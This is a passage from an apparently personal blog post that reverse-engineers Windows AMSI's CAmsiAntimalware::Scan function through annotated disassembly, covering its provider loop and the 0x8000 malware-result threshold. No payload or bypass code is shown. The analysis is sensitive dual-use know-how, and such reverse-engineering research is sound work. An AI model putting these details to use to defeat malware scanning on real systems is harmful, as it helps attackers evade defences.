&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae83580a&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d15efb70000&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rdx&lt;/span&gt;,[&lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;WPP_GLOBAL_Control&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae841000&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835811&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;483&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bca&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835814&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7451&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;je&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x267&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae835867&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x216&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835816&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;f6411c04&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Ch&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae83581a&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;744&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;je&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x267&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae835867&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21c&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae83581c&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c894c2430&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;r9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835821&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;418&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d561f&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;edx&lt;/span&gt;,[&lt;span style=&#34;color:#66d9ef&#34;&gt;r14&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Fh&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835825&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89442428&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835829&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eb28&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x253&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae835853&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the above snippet it loads &lt;code&gt;eax&lt;/code&gt; into &lt;code&gt;[rdi]&lt;/code&gt;, and value of &lt;code&gt;r15&lt;/code&gt; into &lt;code&gt;r13&lt;/code&gt; and compare some global variables related to &lt;code&gt;WPP&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;According to the decompiled snippet, this checks some global variables related to WPP tracer and if checks are
valid, it jumps to a location in disassembly after setting &lt;code&gt;rdx&lt;/code&gt; register to the address &lt;code&gt;r14 + 1f&lt;/code&gt;. Well this has nothing to do with addresses eventhough the instruction is &lt;code&gt;lea&lt;/code&gt;. &lt;code&gt;r14&lt;/code&gt; is 0x0. therefore what this does is, it loads &lt;code&gt;0x1f&lt;/code&gt; into &lt;code&gt;rdx&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;However, if we step through each instruction, &lt;code&gt;cmp    rcx, rdx&lt;/code&gt; will evaluate to 0x0 and the jump will be taken.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x267&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae835867&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;813&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f00800000&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rdi&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae83586d&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d50&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jge&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2bf&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae8358bf&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x26f&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae83586f&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eb34&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2a5&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae8358a5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in the above snippet, dword value at address stored in &lt;code&gt;rdi&lt;/code&gt; is compared to hex 0x8000, decimal 32768. Aand this is exactly the same value &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result&#34;&gt;msdn&lt;/a&gt; specifies in their documentation for &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum. quoting msdn,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    &#39;Any return result equal to or larger than 32768 is considered malware, and the content
    should be blocked. An app should use AmsiResultIsMalware to determine if this is the case.&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;next instruction is a &lt;code&gt;jge&lt;/code&gt; and it essentially takes the jump if dword at address stored in &lt;code&gt;rdi&lt;/code&gt; (AMSI_RESULT) is greater than or equal to 0x8000. if it is, it breaks from the loop.&lt;/p&gt;
&lt;p&gt;In our case, value at address stored in &lt;code&gt;rdi&lt;/code&gt; is less than 0x8000 so the jump won&amp;rsquo;t be taken.
Instead control flow will be redirected to&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2a5&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358a5&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488344246008&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358ab&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ffc7&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;inc&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358ae&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4983&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c410&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358b2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c3bbec0010000&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;C0h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358b9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f820efeffff&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;jb&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xcd&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae8356cd&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;r15&lt;/code&gt; is incremented by 1 and it is then compared to &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt;, whose value is 1. if &lt;code&gt;r15&lt;/code&gt; is below
that value, it will jump to the address where the loop begins.&lt;/p&gt;
&lt;p&gt;Possibly, the loop is going through every registered anti-malware vendor&amp;rsquo;s COM interface. Since I dont have any anti malware services installed in the VM, its going to loop only once. This also uncovers some
details about &lt;code&gt;CAmsiAntimalware&lt;/code&gt; class members. The loop terminates after loop iterator veriable being compared to &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt;. Therefore &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt; is the value that indicates number of registered anti malware services or AMSI providers.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_iterate_through_providers.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now the question is, we just executed a malicous program and it just got flagged as &lt;code&gt;AMSI_RESULT_NOT_DETECTED&lt;/code&gt;. But we still see powershell produces that red ugly output saying that it detected a malicous program.&lt;/p&gt;
&lt;p&gt;And suprisingly, there&amp;rsquo;s no call to &lt;code&gt;AmsiResultIsMalware&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358c4&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c3baec0010000&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r13&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;C0h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358cb&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;732&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;a&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jae&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2f7&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae8358f7&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2cd&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358cd&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;448&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bf3&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r14d&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358d0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d85e4&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;r12&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;r12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae8358d3&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7428&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;je&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;amsi&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;CAmsiAntimalware&lt;/span&gt;::&lt;span style=&#34;color:#66d9ef&#34;&gt;Scan&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2fd&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae8358fd&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First if condition checks if &lt;code&gt;r13&lt;/code&gt; register is less than the number of providers (this-&amp;gt;0x1c0). We saw
